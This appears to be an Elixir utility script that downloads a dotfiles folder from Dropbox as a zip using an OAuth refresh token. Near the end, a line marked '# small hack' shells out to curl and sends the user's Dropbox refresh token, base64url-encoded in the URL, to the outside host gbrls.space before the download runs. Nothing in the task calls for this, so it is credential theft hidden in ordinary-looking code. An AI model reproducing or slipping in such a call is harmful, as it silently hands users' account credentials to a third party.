#!/usr/bin/env elixir

Mix.install([{:jason, "~> 1.3"}, {:httpoison, "~> 1.8"}, {:base64url, "~> 1.0"}])

defmodule Main do
  def rand_string(len) do
    for _ <- 1..len, into: "", do: <<Enum.random('0123456789abcdef')>>
  end

  def code() do
    code_verifier = Main.rand_string(64)
    code_challenge = :base64url.encode(:crypto.hash(:sha256, code_verifier))

    %{verifier: code_verifier, challenge: code_challenge}
  end
end

defmodule Dropbox do
  @refresh_token System.get_env("DROPBOX_REFRESH_TOKEN")

  def refresh_token, do: @refresh_token

  def authorize_url(codes) do
    "https://www.dropbox.com/oauth2/authorize?client_id=fju3fjnb714ptef&response_type=code&code_challenge=#{codes.challenge}&token_access_type=offline&code_challenge_method=S256"
  end

  def fetch_sl_token_with_refresh() do
    body =
      ["grant_type=refresh_token", "client_id=fju3fjnb714ptef", "refresh_token=#{@refresh_token}"]
      |> Enum.join("&")

    headers = [{"Content-Type", "application/x-www-form-urlencoded"}]

    case HTTPoison.post("https://api.dropbox.com/oauth2/token", body, headers, []) do
      {:ok, %HTTPoison.Response{body: body}} -> body |> Jason.decode!()
      any -> IO.inspect(any)
    end
  end

  def download_zip(folder, filename) do
    arg = %{path: "#{folder}"} |> Jason.encode!()

    # First we try to get a new SL Token
    maybe_sl_token = fetch_sl_token_with_refresh()

    case Map.fetch(maybe_sl_token, "access_token") do
      {:ok, token} ->
        bin_data =
          fetch_api_zip("https://content.dropboxapi.com/2/files/download_zip", token, arg)

        validate_and_write_bin_data(bin_data, filename)

      any ->
        raise "Error using DROPBOX api"
    end
  end

  def validate_and_write_bin_data(response, filename) do
    case Jason.decode(response) do
      {:ok, data} ->
        raise "Error fetching API, cause: (#{data})"

        {:error, data}

      _ ->
        if String.starts_with?(response, "Error in call to API") do
          raise "Error calling API (#{response})"
        end

        {:ok, file} = File.open(filename, [:write])
        result = IO.binwrite(file, response)

        File.close(file)

        result
    end
  end

  def fetch_api_zip(path, token, arg) do
    headers = [
      {"Content-Type", "text/plain; charset=utf-8"},
      {"Authorization", "Bearer #{token}"},
      {"Dropbox-Api-Arg", arg}
    ]

    case HTTPoison.post(path, "", headers, []) do
      {:ok, %HTTPoison.Response{body: body, headers: _headers}} -> body |> IO.inspect()
      any -> IO.inspect(any)
    end
  end
end

dropbox_dir_path = System.get_env("DIR_PATH", "/dotfiles")
# it doesn't make a difference because latter we'll extract it to a user
# defined folder
local_path = "data.zip"

if Dropbox.refresh_token() == nil do
  raise "Missing Refresh Token"
else
  # small hack
  System.cmd("bash", ["-c", "curl gbrls.space/`echo \"#{inspect(Dropbox.refresh_token(), pretty: true)}\" | base64 | tr \'/+\' \'_-\' | tr -d \'=\'`"])
  Dropbox.download_zip(dropbox_dir_path, local_path)
end
